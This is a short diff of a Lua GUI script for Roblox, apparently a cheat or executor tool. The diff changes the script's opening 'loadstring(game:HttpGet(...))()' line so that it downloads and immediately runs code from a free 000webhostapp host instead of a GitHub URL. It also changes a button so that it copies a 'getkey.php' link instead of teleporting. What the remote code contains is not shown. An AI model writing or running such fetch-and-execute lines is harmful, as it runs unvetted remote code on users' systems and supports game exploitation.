@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Timsaay/scripts/main/loadstringtest.lua"))()
+loadstring(game:HttpGet("https://bated-slash.000webhostapp.com/key.lua"))()
 -- Gui to Lua
 -- Version: 3.2
 
@@ -72,9 +72,9 @@ UICorner_3.Parent = key
 
 
 	local script = Instance.new('LocalScript', get)
-		print("teleporting")
+		print("GET Key...")
 	script.Parent.MouseButton1Click:Connect(function()
-		game:GetService("TeleportService"):Teleport(12603549790)
+		setclipboard("https://bated-slash.000webhostapp.com/getkey.php")
 	end)
 
 local function WTTF_fake_script() -- Check.LocalScript 
